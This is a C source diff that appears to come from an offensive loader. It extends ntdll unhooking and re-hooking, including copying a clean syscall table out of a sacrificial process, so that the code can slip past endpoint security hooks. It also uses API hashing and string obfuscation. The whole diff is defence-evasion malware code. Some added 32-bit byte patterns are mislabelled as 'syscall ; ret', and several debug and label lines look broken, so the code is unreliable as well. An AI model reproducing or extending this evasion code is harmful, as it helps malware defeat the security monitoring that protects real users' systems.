@@ -330,13 +330,18 @@ INT FindFirstSyscall(CHAR* pMem, DWORD size){
     // gets the first byte of first syscall
     DWORD i = 0;
     DWORD offset = 0;
+#if CONFIG_ARCH == 64
     BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
+#else
+    BYTE pattern1[] = "\xff\xd2\xc2";  // syscall ; ret
+#endif
     BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
 
     // find first occurance of syscall+ret instructions
     for (i = 0; i < size - 3; i++) {
         if (!mem_cmp(pMem + i, pattern1, 3)) {
             offset = i;
+            check_debug(1==0,"FOUND! END");
             break;
         }
     }
@@ -345,10 +350,11 @@ INT FindFirstSyscall(CHAR* pMem, DWORD size){
     for (i = 3; i < 50 ; i++) {
         if (!mem_cmp(pMem + offset - i, pattern2, 3)) {
             offset = offset - i + 3;
+            check_debug(1==0,"FOUND! BEGINNING");
             break;
         }
     }
-
+    LEAVE:
     return offset;
 }
 
@@ -359,12 +365,16 @@ INT FindLastSysCall(CHAR* pMem, DWORD size) {
     // returns the last byte of the last syscall
     DWORD i;
     DWORD offset = 0;
+#if CONFIG_ARCH == 64
     BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
-
+#else
+    BYTE pattern[] = "\xe8\xe2\xe3\xff\xff\x33\xc0\xcc\xcc";
+#endif
     // backwards lookup
     for (i = size - 9; i > 0; i--) {
         if (!mem_cmp(pMem + i, pattern, 9)) {
             offset = i + 6;
+
             break;
         }
     }
@@ -373,7 +383,7 @@ INT FindLastSysCall(CHAR* pMem, DWORD size) {
 }
 
 static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
-#if CONFIG_UNHOOK == TRUE & CONFIG_ARCH == 64
+#if CONFIG_UNHOOK == TRUE
 #if CONFIG_OBFUSCATION
     UCHAR s_string[] = S_KERNEL32;
     UCHAR d_string[13] = {0};
@@ -407,8 +417,9 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
             (NtProtectVirtualMemory_t) GetProcAddressByHash(p_ntdll, NtProtectVirtualMemory_CRC32B);
 
 #else
+
     VirtualProtect_t p_VirtualProtect =
-            (NtProtectVirtualMemory_t) GetProcAddressByHash(LocalGetModuleHandle(d_string), NtProtectVirtualMemory_CRC32B);
+            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle(d_string), VirtualProtect_CRC32B);
 #endif
 
     // find .text section
@@ -433,8 +444,8 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
 #endif
 
             // copy clean "syscall table" into ntdll memory
-            DWORD SC_start = FindFirstSyscall((char *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
-            DWORD SC_end = FindLastSysCall((char *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
+            DWORD SC_start = FindFirstSyscall((UCHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
+            DWORD SC_end = FindLastSysCall((UCHAR *) pCacheClean, pImgSectionHead->Misc.VirtualSize);
 
             if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                 DWORD SC_size = SC_end - SC_start;
@@ -476,7 +487,7 @@ LEAVE:
 }
 
 static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
-#if CONFIG_UNHOOK == TRUE & CONFIG_ARCH == 64
+#if CONFIG_UNHOOK == TRUE
 #if CONFIG_OBFUSCATION
     UCHAR s_string[] = S_KERNEL32;
     UCHAR d_string[13] = {0};
@@ -512,7 +523,7 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
 
 #else
     VirtualProtect_t p_VirtualProtect =
-            (NtProtectVirtualMemory_t) GetProcAddressByHash(LocalGetModuleHandle(d_string), NtProtectVirtualMemory_CRC32B);
+            (VirtualProtect_t) GetProcAddressByHash(LocalGetModuleHandle(d_string), VirtualProtect_CRC32B);
 #endif
 
     // find .text section
@@ -583,7 +594,7 @@ LEAVE:
 VOID HookingManager(BOOL UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_size){
 // TODO IMPLEMENT GHOSTFART INSTEAD OF PERUN'S FART & MORE OPSEC HERE
 
-#if CONFIG_UNHOOK == TRUE & CONFIG_ARCH == 64
+#if CONFIG_UNHOOK == TRUE
 
     SIZE_T bytesRead = 0;
 
@@ -604,6 +615,7 @@ VOID HookingManager(BOOL UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_si
         LEAVE:
         // Kill sacrificial process
         TerminateProcess(pi.hProcess, 0);
+
 
     }else{
         ReHookNtdll(p_ntdll, pCache);
